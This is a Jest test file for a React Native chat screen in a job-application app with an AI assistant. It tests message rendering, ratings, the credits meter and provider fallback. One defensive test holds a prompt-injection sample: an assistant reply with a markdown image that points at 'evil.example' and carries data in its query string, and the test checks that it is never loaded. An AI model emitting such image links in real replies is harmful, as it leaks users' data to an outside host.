import React from 'react';
import { StyleSheet } from 'react-native';
import { fireEvent, render, waitFor } from '@testing-library/react-native';
import { CHAT_INPUT_MAX_LINES } from '../../../../constants';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import '../../../../i18n';

jest.mock('../../hooks/useChatHistory', () => ({
  useChatHistory: jest.fn(),
  useAppendOptimisticMessage: jest.fn(),
  chatHistoryQueryKey: (id: string) => ['chatHistory', id],
}));
jest.mock('../../hooks/useConversations', () => ({
  conversationsQueryKey: ['conversations'],
}));
jest.mock('../../lib/chatStream', () => ({
  streamChatMessage: jest.fn(),
  ChatStreamError: class ChatStreamError extends Error {},
}));
jest.mock('expo-router', () => ({
  useLocalSearchParams: jest.fn(),
  useRouter: () => ({ push: jest.fn() }),
}));

jest.mock('../../../../theme/ThemeContext', () => ({ useTheme: jest.fn() }));
jest.mock('../../../ai/hooks/useAiCredits', () => ({ useAiCredits: jest.fn() }));
const mockRefreshAiCredits = jest.fn().mockResolvedValue(undefined);
jest.mock('../../../ai/hooks/useRefreshAiCredits', () => ({
  useRefreshAiCredits: () => mockRefreshAiCredits,
}));
import { useLocalSearchParams } from 'expo-router';
import { useAppendOptimisticMessage, useChatHistory } from '../../hooks/useChatHistory';
import { streamChatMessage } from '../../lib/chatStream';
import { ChatScreen } from '../ChatScreen';
import type { ChatMessage } from '../../types';
import { useTheme } from '../../../../theme/ThemeContext';
import { lightColors } from '../../../../theme/colors';
import { useAiCredits } from '../../../ai/hooks/useAiCredits';
import {
  exhaustedCredits,
  ownKeyCredits,
  trakwynCredits,
} from '../../../ai/testing/aiCreditsFixture';

const mockedUseChatHistory = jest.mocked(useChatHistory);
const mockedUseAppendOptimisticMessage = jest.mocked(useAppendOptimisticMessage);
const mockedStreamChatMessage = jest.mocked(streamChatMessage);
const mockedUseLocalSearchParams = jest.mocked(useLocalSearchParams);
const mockedUseTheme = jest.mocked(useTheme);

const message: ChatMessage = {
  id: '1',
  role: 'assistant',
  content: 'Hello!',
  createdAt: '2026-01-01T00:00:00.000Z',
};

/** The host element types in a rendered tree, without serialising props (a screen's tree is circular). */
function hostTypes(node: unknown): string[] {
  if (Array.isArray(node)) return node.flatMap(hostTypes);
  if (node === null || typeof node !== 'object') return [];
  const { type, children } = node as { type: string; children?: unknown };
  return [type, ...hostTypes(children)];
}

function renderScreen(conversationId: string, initialMessage?: string) {
  mockedUseLocalSearchParams.mockReturnValue({ id: conversationId, initialMessage } as never);
  const queryClient = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={queryClient}>
      <ChatScreen />
    </QueryClientProvider>,
  );
}

describe('ChatScreen', () => {
  beforeEach(() => {
    mockedUseTheme.mockReturnValue({
      mode: 'light',
      resolvedScheme: 'light',
      colors: lightColors,
      setMode: jest.fn(),
    } as never);
    jest.clearAllMocks();
    mockedUseAppendOptimisticMessage.mockReturnValue(jest.fn());
    jest.mocked(useAiCredits).mockReturnValue(ownKeyCredits());
  });

  it('renders existing messages', async () => {
    mockedUseChatHistory.mockReturnValue({ data: [message], isLoading: false } as never);

    const { getByText } = await renderScreen('conv-1');

    await waitFor(() => expect(getByText('Hello!')).toBeTruthy());
  });

  // JEF-548: an injected note can make the model write an image or a link; neither may load or open.
  it('shows an assistant image as its alt text, with no Image to fetch it', async () => {
    mockedUseChatHistory.mockReturnValue({
      data: [
        {
          ...message,
          content: 'They liked your portfolio. ![status](https://evil.example/b?d=165000)',
        },
      ],
      isLoading: false,
    } as never);

    const { getByText, queryByText, toJSON } = await renderScreen('conv-1');

    await waitFor(() => expect(getByText('[status]', { exact: false })).toBeTruthy());
    expect(hostTypes(toJSON())).toContain('Text');
    expect(hostTypes(toJSON())).not.toContain('Image');
    expect(queryByText(/evil\.example/)).toBeNull();
  });

  it('shows a proposal card under the assistant reply, live while pending (JEF-469)', async () => {
    mockedUseChatHistory.mockReturnValue({
      data: [
        {
          ...message,
          proposals: [
            {
              id: 'p1',
              toolName: 'update_application',
              summary: 'Move Acme to interviewing',
              status: 'pending',
              error: null,
            },
            {
              id: 'p2',
              toolName: 'create_note',
              summary: 'Add a note on Acme',
              status: 'confirmed',
              error: null,
            },
          ],
        },
      ],
      isLoading: false,
    } as never);

    const { getByText, getByTestId, queryByTestId } = await renderScreen('conv-1');

    await waitFor(() => expect(getByText('Move Acme to interviewing')).toBeTruthy());
    expect(getByTestId('chat-proposal-confirm-p1')).toBeTruthy();
    expect(getByText('Done')).toBeTruthy();
    expect(queryByTestId('chat-proposal-confirm-p2')).toBeNull();
  });

  describe('rating a reply (JEF-547)', () => {
    const userMessage: ChatMessage = { ...message, id: 'u1', role: 'user', content: 'Hi' };

    it('offers thumbs under the assistant reply and not under the user’s own message', async () => {
      mockedUseChatHistory.mockReturnValue({
        data: [userMessage, message],
        isLoading: false,
      } as never);

      const { getByTestId, queryByTestId } = await renderScreen('conv-1');

      await waitFor(() => expect(getByTestId('ai-feedback-up-1')).toBeTruthy());
      expect(getByTestId('ai-feedback-down-1')).toBeTruthy();
      expect(queryByTestId('ai-feedback-up-u1')).toBeNull();
    });

    it('shows the rating stored for a reply', async () => {
      mockedUseChatHistory.mockReturnValue({
        data: [{ ...message, myRating: { rating: 'UP', reason: null } }],
        isLoading: false,
      } as never);

      const { getByTestId } = await renderScreen('conv-1');

      await waitFor(() =>
        expect(getByTestId('ai-feedback-up-1').props.accessibilityState.selected).toBe(true),
      );
    });

    it('offers no thumbs under a reply that has no stored id yet', async () => {
      mockedUseChatHistory.mockReturnValue({
        data: [{ ...message, id: 'optimistic-123' }],
        isLoading: false,
      } as never);

      const { queryByTestId } = await renderScreen('conv-1');

      expect(queryByTestId('ai-feedback-up-optimistic-123')).toBeNull();
    });
  });

  describe('AI credits meter (JEF-511)', () => {
    const send = async (screen: Awaited<ReturnType<typeof render>>) => {
      await fireEvent.changeText(screen.getByTestId('chat-input'), 'Hi');
      await fireEvent.press(screen.getByTestId('chat-send-button'));
      await waitFor(() => expect(mockedStreamChatMessage).toHaveBeenCalled());
    };

    beforeEach(() => {
      mockedUseChatHistory.mockReturnValue({ data: [], isLoading: false } as never);
    });

    it('shows how many credits are left for a user on Trakwyn AI', async () => {
      jest.mocked(useAiCredits).mockReturnValue(trakwynCredits());

      const { findByTestId } = await renderScreen('conv-1');

      expect(String((await findByTestId('chat-credits')).props.children)).toContain('12');
    });

    it('shows nothing for a user on their own key', async () => {
      const { queryByTestId } = await renderScreen('conv-1');

      expect(queryByTestId('chat-credits')).toBeNull();
    });

    it('turns amber when nearing the end of the credits', async () => {
      jest.mocked(useAiCredits).mockReturnValue(
        trakwynCredits({
          standing: { left: 3, total: 30, ratio: 0.9, nearing: true, exhausted: false },
        }),
      );

      const { findByTestId } = await renderScreen('conv-1');

      expect(StyleSheet.flatten((await findByTestId('chat-credits')).props.style).color).toBe(
        lightColors.warning,
      );
    });

    it('turns red when none are left', async () => {
      jest.mocked(useAiCredits).mockReturnValue(exhaustedCredits());

      const { findByTestId } = await renderScreen('conv-1');

      expect(StyleSheet.flatten((await findByTestId('chat-credits')).props.style).color).toBe(
        lightColors.danger,
      );
    });

    it('re-reads the credits after a turn is sent', async () => {
      jest.mocked(useAiCredits).mockReturnValue(trakwynCredits());
      mockedStreamChatMessage.mockResolvedValueOnce(undefined);

      await send(await renderScreen('conv-1'));

      await waitFor(() => expect(mockRefreshAiCredits).toHaveBeenCalledTimes(1));
    });

    it('re-reads the credits when the turn fails too', async () => {
      jest.mocked(useAiCredits).mockReturnValue(trakwynCredits());
      mockedStreamChatMessage.mockRejectedValueOnce(new Error('boom'));

      await send(await renderScreen('conv-1'));

      await waitFor(() => expect(mockRefreshAiCredits).toHaveBeenCalledTimes(1));
    });
  });

  describe('provider fallback (JEF-503)', () => {
    const sendWith = async (fallback: { from: string; to: string } | null) => {
      mockedUseChatHistory.mockReturnValue({ data: [], isLoading: false } as never);
      mockedStreamChatMessage.mockImplementationOnce(async ({ onFallback }) => {
        if (fallback) onFallback?.(fallback);
      });
      const screen = await renderScreen('conv-1');
      await fireEvent.changeText(screen.getByTestId('chat-input'), 'Hi');
      await fireEvent.press(screen.getByTestId('chat-send-button'));
      await waitFor(() => expect(mockedStreamChatMessage).toHaveBeenCalled());
      return screen;
    };

    it('says which provider took over when the first could not answer', async () => {
      const { findByTestId } = await sendWith({ from: 'openai', to: 'anthropic' });

      expect((await findByTestId('chat-fallback-notice')).props.children).toBe(
        'OpenAI could not answer, so Anthropic did.',
      );
    });

    it('names Trakwyn AI on either side of the switch', async () => {
      const { findByTestId } = await sendWith({ from: 'trakwyn', to: 'openai' });

      expect((await findByTestId('chat-fallback-notice')).props.children).toBe(
        'Trakwyn AI could not answer, so OpenAI did.',
      );
    });

    it('shows nothing when the first provider answered', async () => {
      const { queryByTestId } = await sendWith(null);

      expect(queryByTestId('chat-fallback-notice')).toBeNull();
    });
  });

  it('sends a message and streams the reply', async () => {
    mockedUseChatHistory.mockReturnValue({ data: [], isLoading: false } as never);
    mockedStreamChatMessage.mockResolvedValueOnce(undefined);

    const { getByTestId } = await renderScreen('conv-1');

    await fireEvent.changeText(getByTestId('chat-input'), 'What should I ask in my interview?');
    await fireEvent.press(getByTestId('chat-send-button'));

    await waitFor(() =>
      expect(mockedStreamChatMessage).toHaveBeenCalledWith(
        expect.objectContaining({
          conversationId: 'conv-1',
          message: 'What should I ask in my interview?',
        }),
      ),
    );
  });

  it('sends a multi-line message intact and caps the composer at ten lines (JEF-481)', async () => {
    mockedUseChatHistory.mockReturnValue({ data: [], isLoading: false } as never);
    mockedStreamChatMessage.mockResolvedValueOnce(undefined);

    const { getByTestId } = await renderScreen('conv-1');
    const input = getByTestId('chat-input');

    expect(input.props.multiline).toBe(true);
    const { maxHeight, lineHeight, paddingVertical } = StyleSheet.flatten(input.props.style);
    expect(maxHeight).toBe(lineHeight * CHAT_INPUT_MAX_LINES + paddingVertical * 2);

    await fireEvent.changeText(input, 'First line\nSecond line');
    await fireEvent.press(getByTestId('chat-send-button'));

    await waitFor(() =>
      expect(mockedStreamChatMessage).toHaveBeenCalledWith(
        expect.objectContaining({ message: 'First line\nSecond line' }),
      ),
    );
  });

  it('auto-sends the initial message from a freshly created conversation', async () => {
    mockedUseChatHistory.mockReturnValue({ data: [], isLoading: false } as never);
    mockedStreamChatMessage.mockResolvedValueOnce(undefined);

    await renderScreen('new-conv', 'Hi there');

    await waitFor(() =>
      expect(mockedStreamChatMessage).toHaveBeenCalledWith(
        expect.objectContaining({ conversationId: 'new-conv', message: 'Hi there' }),
      ),
    );
  });

  it.each([
    ['PLAN_REQUIRED', 'Trakwyn AI is included with Pro.'],
    ['AI_CREDITS_EXHAUSTED', "You've used this month's AI credits."],
  ])('%s shows the API message with Upgrade and Add your own key (JEF-451)', async (code, text) => {
    mockedUseChatHistory.mockReturnValue({ data: [], isLoading: false } as never);
    mockedStreamChatMessage.mockRejectedValue({
      response: { errors: [{ message: text, extensions: { code } }] },
    });

    const { getByTestId, findByTestId, findByText } = await renderScreen('conv-1');
    await fireEvent.changeText(getByTestId('chat-input'), 'Hi');
    await fireEvent.press(getByTestId('chat-send-button'));

    expect(await findByTestId('ai-credits-exhausted-notice')).toBeTruthy();
    expect(await findByText(new RegExp(text.slice(0, 12)))).toBeTruthy();
    expect(getByTestId('ai-upgrade-button')).toBeTruthy();
    expect(getByTestId('ai-add-key-button')).toBeTruthy();
  });
});
